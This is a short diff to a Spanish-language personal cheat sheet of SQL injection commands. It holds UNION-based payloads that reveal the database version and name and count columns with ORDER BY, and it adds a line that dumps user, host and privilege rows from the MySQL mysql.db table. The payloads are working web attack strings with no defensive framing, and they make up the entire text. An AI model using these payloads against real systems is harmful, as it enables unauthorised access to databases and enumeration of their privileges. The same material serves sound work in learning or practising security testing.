@@ -5,6 +5,7 @@ Comandos para SQL INJECTION:
 	NOTA: cuando se hace un UNION el número de columnas debe de coincidir con ambas tablas
 2) Saber la version de la BD y el nombre de la BD
 	-mariaflores' UNION SELECT 1,@@version,database() -- 
+2.1) -diego99' UNION SELECT User,Host,Select_priv FROM mysql.db -- 
 
 3) Saber el numero de columnas (si tira error es porque no se ha acertado al numero de cols)
 	' ORDER BY 3 -- 
